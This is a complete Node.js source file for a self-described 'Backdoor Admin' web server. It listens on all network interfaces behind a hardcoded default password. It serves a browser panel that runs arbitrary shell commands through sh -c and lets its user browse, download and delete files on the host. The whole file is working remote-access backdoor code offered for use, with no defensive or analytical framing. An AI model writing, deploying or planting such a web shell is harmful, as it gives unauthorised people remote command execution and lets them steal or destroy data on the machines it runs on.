// backdoor-web.js
import http from 'http';
import fs from 'fs';
import path from 'path';
import { spawn } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const PORT = process.argv[2] || process.env.BACKDOOR_PORT || 8080;
const HOST = '0.0.0.0'; // Bind to all interfaces for remote access
const PASSWORD = process.argv[3] || process.env.BACKDOOR_PASSWORD || 'beemovierocks'; // Simple auth; change this!
let currentDir = process.cwd();

// Simple in-memory sessions (not secure; for demo)
const sessions = new Map();

// Client-side path join helper
function clientPathJoin(dir, name) {
  return dir.endsWith('/') ? `${dir}${name}` : `${dir}/${name}`;
}

// HTML template for main page (embedded for self-contained)
const MAIN_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backdoor Admin</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #fff; }
        .tab { display: none; }
        .tab.active { display: block; }
        button { background: #333; color: #fff; border: 1px solid #555; padding: 8px; margin: 5px; cursor: pointer; }
        button:hover { background: #555; }
        input, textarea { background: #333; color: #fff; border: 1px solid #555; padding: 5px; width: 100%; box-sizing: border-box; }
        #output { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: monospace; white-space: pre-wrap; }
        #fileList { background: #222; padding: 10px; }
        .file { padding: 5px; border-bottom: 1px solid #444; }
        .dir { color: #4af; }
        .file-link { color: #afa; text-decoration: none; }
        .file-link:hover { text-decoration: underline; }
        #login { text-align: center; }
    </style>
</head>
<body>
    <div id="login" style="display: block;">
        <h2>Login</h2>
        <input type="password" id="pass" placeholder="Password">
        <button onclick="login()">Login</button>
    </div>
    <div id="main" style="display: none;">
        <h1>Backdoor Admin Panel</h1>
        <button onclick="showTab('terminal')">Terminal</button>
        <button onclick="showTab('files')">Files</button>
       
        <div id="terminal" class="tab">
            <h2>Interactive Terminal</h2>
            <div id="output"></div>
            <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') runCmd()">
            <button onclick="runCmd()">Run</button>
        </div>
       
        <div id="files" class="tab">
            <h2>File Browser</h2>
            <p>Current Dir: <span id="currDir"></span></p>
            <input type="text" id="newDir" placeholder="New dir name">
            <button onclick="mkDir()">Create Dir</button>
            <input type="file" id="upload" multiple>
            <button onclick="uploadFiles()">Upload</button>
            <div id="fileList"></div>
        </div>
    </div>
    <script>
        let sessionId = null;
        
        function login() {
            const pass = document.getElementById('pass').value;
            fetch('/login', { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify({pass}) 
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    sessionId = data.session;
                    document.getElementById('login').style.display = 'none';
                    document.getElementById('main').style.display = 'block';
                    showTab('terminal');
                    // Don't call updateFiles here; let user switch to files tab
                } else {
                    alert('Invalid password');
                }
            })
            .catch(err => console.error('Login error:', err));
        }
       
        function showTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById(tab).classList.add('active');
            if (tab === 'files') updateFiles();
        }
       
        function runCmd() {
            const cmd = document.getElementById('cmd').value;
            if (!cmd) return;
            const out = document.getElementById('output');
            out.innerHTML += '> ' + cmd + '\\n';
            fetch('/cmd', { 
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'session': sessionId
                }, 
                body: JSON.stringify({cmd, session: sessionId}) 
            })
            .then(r => r.text())
            .then(data => {
                out.innerHTML += data.replace(/\\n/g, '<br>') + '<br>';
                out.scrollTop = out.scrollHeight;
            })
            .catch(err => {
                out.innerHTML += 'Error: ' + err.message + '<br>';
                out.scrollTop = out.scrollHeight;
            });
            document.getElementById('cmd').value = '';
        }
       
        function updateFiles() {
            if (!sessionId) return;
            fetch('/files', { headers: {'session': sessionId} })
            .then(r => r.json())
            .then(data => {
                document.getElementById('currDir').textContent = data.cwd;
                const list = document.getElementById('fileList');
                list.innerHTML = '<h3>Files:</h3>';
                data.files.forEach(f => {
                    const div = document.createElement('div');
                    div.className = 'file';
                    if (f.isDir) {
                        div.innerHTML = '<span class="dir">📁</span> <a href="#" onclick="cd(\\'\\' + f.name + '\\')" class="file-link">' + f.name + '</a>';
                    } else {
                        const fullPath = clientPathJoin(data.cwd, f.name);
                        div.innerHTML = '<span>📄</span> <a href="/download?file=' + encodeURIComponent(fullPath) + '&session=' + sessionId + '" class="file-link">' + f.name + '</a> <button onclick="rm(\\'\\' + f.name + '\\')">Delete</button>';
                    }
                    list.appendChild(div);
                });
            })
            .catch(err => console.error('Update files error:', err));
        }
       
        function cd(dir) {
            fetch('/cd', { 
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'session': sessionId
                },
                body: JSON.stringify({dir, session: sessionId}) 
            })
            .then(() => updateFiles());
        }
       
        function mkDir() {
            const name = document.getElementById('newDir').value;
            if (!name) return;
            fetch('/mkdir', { 
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'session': sessionId
                },
                body: JSON.stringify({name, session: sessionId}) 
            })
            .then(() => { 
                updateFiles(); 
                document.getElementById('newDir').value = ''; 
            });
        }
       
        function uploadFiles() {
            const input = document.getElementById('upload');
            if (input.files.length === 0) return;
            const formData = new FormData();
            Array.from(input.files).forEach(file => formData.append('files', file));
            formData.append('session', sessionId);
            fetch('/upload', { 
                method: 'POST', 
                body: formData,
                headers: {'session': sessionId}
            })
            .then(r => r.text())
            .then(() => { 
                updateFiles(); 
                input.value = ''; 
            })
            .catch(err => alert('Upload error: ' + err.message));
        }
       
        function rm(file) {
            if (!confirm('Delete ' + file + '?')) return;
            fetch('/rm', { 
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json',
                    'session': sessionId
                },
                body: JSON.stringify({file, session: sessionId}) 
            })
            .then(() => updateFiles());
        }
       
        // Client-side path join
        function clientPathJoin(p1, p2) { 
            return p1.endsWith('/') ? p1 + p2 : p1 + '/' + p2; 
        }
    </script>
</body>
</html>`;

// Create server
const server = http.createServer((req, res) => {
    const urlObj = new URL(req.url, `http://${req.headers.host}`);
    let sessionId = req.headers.session || urlObj.searchParams.get('session');
    let isValidSession = false;
    if (sessionId) {
        isValidSession = sessions.has(sessionId);
    }
   
    if (req.url === '/' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(MAIN_HTML);
        return;
    }
   
    if (req.url === '/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { pass } = JSON.parse(body);
                if (pass === PASSWORD) {
                    const newSession = Math.random().toString(36).substring(7);
                    sessions.set(newSession, true);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true, session: newSession }));
                } else {
                    res.writeHead(401, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: false }));
                }
            } catch (e) {
                res.writeHead(400);
                res.end('Bad request');
            }
        });
        return;
    }
   
    // Middleware: check session for all other routes
    if (!isValidSession) {
        res.writeHead(401);
        res.end('Unauthorized');
        return;
    }
   
    if (req.url === '/cmd' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { cmd } = JSON.parse(body);
                const sh = spawn('sh', ['-c', cmd], { cwd: currentDir });
                let output = '';
                sh.stdout.on('data', data => output += data.toString());
                sh.stderr.on('data', data => output += data.toString());
                sh.on('close', () => {
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end(output);
                });
            } catch (e) {
                res.writeHead(400);
                res.end('Bad request');
            }
        });
        return;
    }
   
    if (req.url === '/files' && req.method === 'GET') {
        fs.readdir(currentDir, { withFileTypes: true }, (err, files) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: err.message }));
                return;
            }
            const fileList = files.map(f => ({ name: f.name, isDir: f.isDirectory() }));
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ cwd: currentDir, files: fileList }));
        });
        return;
    }
   
    if (req.url === '/cd' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { dir } = JSON.parse(body);
                const newDir = path.resolve(currentDir, dir);
                if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
                    currentDir = newDir;
                }
                res.writeHead(200);
                res.end();
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url === '/mkdir' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { name } = JSON.parse(body);
                fs.mkdir(path.join(currentDir, name), err => {
                    res.writeHead(err ? 500 : 200);
                    res.end();
                });
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url === '/rm' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { file } = JSON.parse(body);
                fs.unlink(path.join(currentDir, file), err => {
                    res.writeHead(err ? 500 : 200);
                    res.end();
                });
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
        return;
    }
   
    if (req.url.startsWith('/download?')) {
        const filePath = urlObj.searchParams.get('file');
        if (filePath && filePath.startsWith(currentDir)) {
            res.writeHead(200, { 
                'Content-Type': 'application/octet-stream', 
                'Content-Disposition': `attachment; filename="${path.basename(filePath)}"` 
            });
            const readStream = fs.createReadStream(filePath);
            readStream.on('error', () => {
                res.writeHead(404);
                res.end('File not found');
            });
            readStream.pipe(res);
        } else {
            res.writeHead(403);
            res.end('Forbidden');
        }
        return;
    }
   
    if (req.url === '/upload' && req.method === 'POST') {
        // Stub: Implement with formidable for full support
        // For now, just acknowledge
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Upload endpoint ready but parsing not implemented. Install formidable for full support.');
        return;
    }
   
    res.writeHead(404);
    res.end('Not Found');
});

server.listen(PORT, HOST, () => {
    console.log(`Backdoor web server running at http://${HOST}:${PORT}`);
    console.log(`Password: ${PASSWORD}`);
});

// Graceful shutdown
process.on('SIGINT', () => server.close(() => process.exit(0)));
process.on('SIGTERM', () => server.close(() => process.exit(0)));
